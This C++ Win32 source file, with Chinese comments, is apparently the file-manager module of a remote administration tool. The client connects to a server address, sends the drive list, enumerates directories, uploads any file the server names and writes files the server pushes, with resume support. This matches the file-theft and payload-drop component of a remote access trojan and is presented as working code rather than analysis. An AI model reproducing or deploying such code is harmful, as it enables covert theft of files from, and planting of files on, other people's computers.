#include "stdafx.h"
#include "FileCommand.h"
#include "../Common/Buffer.h"
#include "../Common/common.h"


CFileCommand::CFileCommand(char* szIP, int nPort)
{
    m_szIp = szIP;
    m_nPort = nPort;
    m_ClientSocket.SetComand(this);
    m_hEvent = ::CreateEvent(NULL, TRUE, FALSE, NULL);
}

CFileCommand::~CFileCommand()
{
}

void CFileCommand::OnRecv(char* pBuffer, int nSize)
{
    //传送数据的时候先去掉垃圾
    switch (pBuffer[0])
    {
    case COMMAND_FILE_BEGIN:
        //发送盘符
        GetDisk();
        break;
    case  COMMAND_FILE_DIR:
        //枚举文件夹
        OpenLocalFilePath(pBuffer+1);
        break;
    case COMMAND_FILE_Size:
        //收文件头
        CreateLocalRecvFile(pBuffer + 1);
        break;
    case COMMAND_FILE_Data:
        //写文件
        WriteLocalFile(pBuffer + 1, nSize-1);
        break;
    case COMMAND_FILE_Down:
        //响应服务器下载
        UploadFile(pBuffer + 1);
        break;
    case COMMAND_CONTINUE:
        //响应服务器下载数据请求
        SendFileData(pBuffer + 1);
        break;
    case COMMAND_FILE_TRANSFMODE_COVER:
        NewCreateFlie();//覆盖
        break;
    case COMMAND_FILE_TRANSFMODE_CONTINUE:
        GetFileData();//续传
        break;
    case COMMAND_HEARTBEAT:       //心跳
        m_dwLastTime = GetTickCount() / 1000;
        break;
    default:
        break;
    }
}

void CFileCommand::OnSend(char* pBuffer, int nSize)
{
    m_ClientSocket.OnSend(pBuffer, nSize);
}

void CFileCommand::Execute()
{
    OutputDebugStringA("Log:FileCmd开始执行");
    bool bRet = m_ClientSocket.ConnectServer(m_szIp, m_nPort);
    if (!bRet)
    {
        return;
    }
    m_dwLastTime = GetTickCount() / 1000;
    char bCommand = COMMAND_OPEN_FILEDLG;
    OutputDebugStringA("Log:发送打开FILE窗口消息");
    OnSend(&bCommand, sizeof(char));

    //等待事件
    WaitForSingleObject(m_hEvent, INFINITE);
    OutputDebugStringA("Log:CFileCommand::Execute()执行完毕");
}

void CFileCommand::OnClose()
{
    SetEvent(m_hEvent);
}
//获取磁盘盘符
void CFileCommand::GetDisk()
{
    //获取盘符
    char buf[MAXBYTE] = { 0 };
    buf[0] = COMMAND_PANFU;
    GetLogicalDriveStringsA(MAXBYTE - 1, buf+1);
    OnSend(buf, MAXBYTE);
    OutputDebugStringA("Log:发送盘符完成");
}

bool CFileCommand::OpenLocalFilePath(char* pBuffer)
{
    CString csPath(pBuffer);
    CBuffer DataBuf;
    char Type = COMMAND_FILE_DIR;
    DataBuf.Write((PBYTE)&Type, sizeof(char));
    if (csPath.IsEmpty())
    {
        return false;
    }
    CFileFind Finder;
    CString csRoot;
    BOOL bWorking = Finder.FindFile(csPath + _T("*.*"));
    while (bWorking)
    {
        bWorking = Finder.FindNextFile();
        CString str = Finder.GetFilePath();
        csRoot = Finder.GetRoot();
        DWORD dwFileAttribute = GetFileAttributes(str);
        SHFILEINFO sfi;
        SHGetFileInfo(str,
            dwFileAttribute,
            &sfi, sizeof(sfi),
            SHGFI_SYSICONINDEX | SHGFI_USEFILEATTRIBUTES);
        CString csFileName = Finder.GetFileName();//文件名
        char ch = Finder.IsDirectory();//是否是目录
        ULONGLONG nFileSize = Finder.GetLength();
        string strFileName = UnicodeToAscii(csFileName.GetString());
        DataBuf.Write((PBYTE)strFileName.data(), strFileName.length()+1);//文件名
        DataBuf.Write((PBYTE)&nFileSize, sizeof(nFileSize));//文件大小
        DataBuf.Write((PBYTE)&ch, sizeof(char));//是否是目录 
    }
    OnSend((char*)DataBuf.GetBuffer(), DataBuf.GetBufferLen());
    return true;
}

void CFileCommand::CreateLocalRecvFile(char* pBuffer)
{
    //获取文件大小
    FILESIZE	*pFileSize = (FILESIZE *)pBuffer;
    //保存文件路径
    char szFilePath[MAX_PATH] = {0};
    //+8去掉文件长度
    strcpy_s(szFilePath,pBuffer + 8);
    
    CString    csTemp(szFilePath);
    m_csDownloadFilePath = csTemp;
    //根据文件路径创建文件夹
    MakeSureDirectoryPathExists(m_csDownloadFilePath);
    //查找文件
    WIN32_FIND_DATA FindFileData;
    HANDLE hFind = FindFirstFile(m_csDownloadFilePath, &FindFileData);

    if (hFind != INVALID_HANDLE_VALUE)
    {
        //文件存在 覆盖还是续传  请求传输模式
        char Type = COMMAND_FILE_TRANSFMODE;
        OnSend(&Type, sizeof(char));
    }
    else
    {
        //文件不存在请求服务器发送数据
        GetFileData();
    }
    FindClose(hFind);
}

bool CFileCommand::GetFileData()
{
    DWORD	dwCreationDisposition;

    WIN32_FIND_DATA FindFileData;
    HANDLE hFind = FindFirstFile(m_csDownloadFilePath, &FindFileData);
    char szBuf[9] = { 0 };
    char Type = COMMAND_CONTINUE;
    memcpy(szBuf, &Type, sizeof(char));
    if (hFind != INVALID_HANDLE_VALUE)
    {
        //如果文件存在 获取文件大小 给服务器文件读写用指针
        memcpy(szBuf + 1, &FindFileData.nFileSizeHigh, 4);
        memcpy(szBuf + 5, &FindFileData.nFileSizeLow, 4);
        //打开已存在
        dwCreationDisposition = OPEN_EXISTING;
    }
    else
    {
        //不存在新建
        dwCreationDisposition = CREATE_NEW;
    }
    FindClose(hFind);
    //根据文件标志打开文件
    HANDLE	hFile =CreateFile(
        m_csDownloadFilePath,
        GENERIC_WRITE,
        FILE_SHARE_WRITE,
        NULL,
        dwCreationDisposition,
        FILE_ATTRIBUTE_NORMAL,
        0
        );
    // 需要错误处理
    if (hFile == INVALID_HANDLE_VALUE)
    {
        return false;
    }
    CloseHandle(hFile);
    //发送请求
    OnSend(szBuf, sizeof(szBuf));
    return true;
}

bool CFileCommand::WriteLocalFile(char* pBuffer, int nSize)
{
    Dbgprintf("Log:收到文件数据%d", nSize);
    //取文件传送大小
    FILESIZE	*pFileSize = NULL;
    // 1 + 4 + 4  数据包头部大小，为固定的9
    int		nHeadLength = 9; 
    DWORD	dwBytesToWrite;
    DWORD	dwBytesWrite;
    //文件数据指针
    char*   pData = NULL;
    pFileSize = (FILESIZE*)pBuffer;
    pData = pBuffer + sizeof(FILESIZE);
    // 得到数据在文件中的偏移
    LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
    LONG	dwOffsetLow = pFileSize->dwSizeLow;
    //写入数据长度 要去掉8个字节
    dwBytesToWrite = nSize - 8;
    HANDLE	hFile =CreateFile
        (
        m_csDownloadFilePath,
        GENERIC_WRITE,
        FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        0
        );
    if (hFile == INVALID_HANDLE_VALUE)
    {
        return false;
    }
    SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
    int nRet = 0;
    // 写入文件
    nRet = WriteFile
        (
        hFile,
        pData,
        dwBytesToWrite,
        &dwBytesWrite,
        NULL
        );
    CloseHandle(hFile);
    //请求下一次发送
    char szBuf[9] = { 0 };
    szBuf[0] = COMMAND_CONTINUE;
    dwOffsetLow += dwBytesWrite;
    memcpy(szBuf + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
    memcpy(szBuf + 5, &dwOffsetLow, sizeof(dwOffsetLow));
    OnSend(szBuf, sizeof(szBuf));
    return true;
}

bool CFileCommand::UploadFile(char* pBuffer)
{
    DWORD	dwSizeHigh;
    DWORD	dwSizeLow;
    //保存文件路径
    char szFilePath[MAX_PATH] = { 0 };
    strcpy_s(szFilePath,pBuffer+8);
    m_csUploadFilePath = szFilePath;
    //打开文件
    HANDLE hFile = CreateFile(m_csUploadFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        return false;
    }
    //获取文件大小
    dwSizeLow = GetFileSize(hFile, &dwSizeHigh);
    m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD + 1)) + dwSizeLow;
    CloseHandle(hFile);
    //给服务器开始发   这里能保证文件存在
    SendFileData(pBuffer);
    return true;
}

bool CFileCommand::SendFileData(char* pBuffer)
{
    //拿文件大小
    FILESIZE* pFileSize = (FILESIZE*)pBuffer;
    LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
    LONG	dwOffsetLow = pFileSize->dwSizeLow;
    m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);
    if (m_nCounter == m_nOperatingFileLength || pFileSize->dwSizeLow == -1)
    {
        //通知服务器发送完成
        char Type = COMMAND_FILE_END;
        OnSend(&Type, sizeof(Type));
    }
    //打开文件
    HANDLE hFile = CreateFile(m_csUploadFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        return false;
    }
    //每次重新设置文件指针
    SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
    int nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
    //设置每次读多少
    DWORD	nNumberOfBytesToRead = FILE_SEND_SIZE - nHeadLength;
    //保存返回用
    DWORD	nNumberOfBytesRead = 0;
    //分配缓冲区
    char* pFileBuf = new char[FILE_SEND_SIZE];
    if (pFileBuf == NULL)
    {
        return false;
    }
    memset(pFileBuf, 0, nNumberOfBytesToRead);
    //填写缓冲区
    char Type = COMMAND_FILE_Data;
    memcpy(pFileBuf, &Type, sizeof(char));
    memcpy(pFileBuf + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));  //文件指针
    memcpy(pFileBuf + 5, &dwOffsetLow, sizeof(dwOffsetLow));    //文件指针
    ReadFile(hFile, pFileBuf + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
    CloseHandle(hFile);
    hFile = INVALID_HANDLE_VALUE;
    //读到数据发送
    if (nNumberOfBytesRead > 0)
    {
        int	nPacketSize = nNumberOfBytesRead + nHeadLength;
        OnSend(pFileBuf, nPacketSize);
        OutputDebugStringA("Log:数据发送成功");
    }
    delete[] pFileBuf;
    return true;
}

bool CFileCommand::NewCreateFlie()
{
    //创建一个新的文件覆盖
    HANDLE	hFile = CreateFile(
        m_csDownloadFilePath,
        GENERIC_WRITE,
        FILE_SHARE_WRITE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        0
        );
    // 需要错误处理
    if (hFile == INVALID_HANDLE_VALUE)
    {
        return false;
    }
    CloseHandle(hFile);
    GetFileData();
    return true;
}

